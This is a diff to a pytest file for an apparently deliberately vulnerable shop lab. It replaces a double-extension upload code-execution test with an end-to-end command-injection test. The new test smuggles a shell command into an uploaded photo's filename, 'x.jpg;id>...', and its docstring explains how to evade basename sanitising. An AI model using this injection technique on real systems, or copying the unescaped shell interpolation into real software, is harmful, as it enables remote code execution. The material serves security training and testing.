@@ -2,12 +2,12 @@
 deterministically: POST /api/catalog/products, authenticated only with a
 leaked catalog-sync-service token (no session, no admin role -- a mere
 customer's own login never grants this), accepts a photo whose filename
-merely CONTAINS ".jpg" (app/services/catalog_photos.py::looks_like_jpeg_filename),
-not that it's the real extension. A file named "plugin.jpg.py" satisfies
-that check while its real extension -- the one
-vulnerable/upload/image_processor.py actually executes on -- is `.py`.
+merely CONTAINS ".jpg" (app/services/catalog_photos.py::looks_like_jpeg_filename)
+and ends in a real image extension -- but that filename is later
+interpolated, unescaped, into a shell command line by
+vulnerable/upload/image_processor.py's thumbnail generation step (CWE-78).
 
-This is the same underlying CWE-434 proof as the old
+This is the same underlying vulnerability-chain proof as the old
 tests/test_upload_vuln.py (which still covers app/routes/api_images.py in
 isolation, now reachable only via this app's own backend), just reached
 through the attacker-facing front door instead.
@@ -15,10 +15,12 @@ through the attacker-facing front door instead.
 import io
 import os
 
+import pytest
+
 from app.config import config
 from app.models.db import query_one
 
-PROOF_MARKER = "shoplab_catalog_sync_rce_proof"
+PROOF_FILENAME = "shoplab_cmdinject_proof.txt"
 
 
 def test_missing_or_wrong_token_rejected(client):
@@ -91,29 +93,43 @@ def test_genuine_jpg_photo_is_accepted_and_served(client, catalog_sync_token):
     assert resp.status_code == 200
 
 
-def test_double_extension_photo_actually_executes(client, catalog_sync_token):
-    """End-to-end proof of remote code execution: 'plugin.jpg.py' contains
-    the required '.jpg' substring (passes catalog_photos.py's check) but
-    its real extension is '.py' (what image_processor.py branches on)."""
-    payload = f"""
-import os
-os.environ['{PROOF_MARKER}'] = 'executed'
-open(os.path.join(os.path.dirname(__file__), 'catalog_sync_rce_proof.txt'), 'w').write('code executed as this process')
-"""
+@pytest.mark.skipif(
+    os.name != "posix",
+    reason="the injected filename relies on POSIX shell (/bin/sh) semantics -- ';' sequencing and '#' comments",
+)
+def test_malicious_filename_actually_executes_via_command_injection(client, catalog_sync_token):
+    """End-to-end proof of remote code execution: the filename contains the
+    required '.jpg' substring (passes catalog_photos.py's check) and ends in
+    a real image extension (so image_processor.py takes the "generate a
+    thumbnail" path) -- but the same filename also carries shell
+    metacharacters that break out of the `convert` command line it gets
+    interpolated into, unescaped, with no quoting at all (CWE-78).
+
+    The injected command must avoid literal '/' characters: everything
+    before the client-supplied filename is joined together with
+    os.path.basename() upstream (api_images.py::_weak_sanitize_filename),
+    which -- like the real os.path.basename -- would truncate anything
+    containing a '/' down to whatever follows the last one. A relative-path
+    write is enough here because image_processor.py runs the shell command
+    with cwd set to the upload directory itself (see its own docstring) --
+    a realistic, ordinary implementation choice that happens to also give
+    an attacker a predictable place to land a relative-path write.
+    """
+    malicious_filename = f"x.jpg;id>{PROOF_FILENAME} #.jpg"
     resp = client.post(
         "/api/catalog/products",
         headers={"X-Catalog-Sync-Token": catalog_sync_token},
         data={
             "name": "Malicious Sync", "category": "x", "description": "x", "price": "1.00",
-            "photo": (io.BytesIO(payload.encode()), "plugin.jpg.py", "image/jpeg"),
+            "photo": (io.BytesIO(b"whatever"), malicious_filename, "image/jpeg"),
         },
         content_type="multipart/form-data",
     )
-    assert resp.status_code == 201, "a filename containing '.jpg' must pass the weak check"
+    assert resp.status_code == 201, "a filename containing '.jpg' and ending in a real image extension must pass the weak checks"
 
-    proof_path = os.path.join(config.UPLOAD_DIR, "catalog_sync_rce_proof.txt")
-    assert os.path.exists(proof_path), "the smuggled .py file should have executed"
-    assert os.environ.get(PROOF_MARKER) == "executed"
+    proof_path = os.path.join(config.UPLOAD_DIR, PROOF_FILENAME)
+    assert os.path.exists(proof_path), "the injected 'id' command should have executed and written this file"
+    content = open(proof_path).read()
+    assert "uid=" in content, "the proof file should contain id's real output"
 
     os.remove(proof_path)
-    del os.environ[PROOF_MARKER]
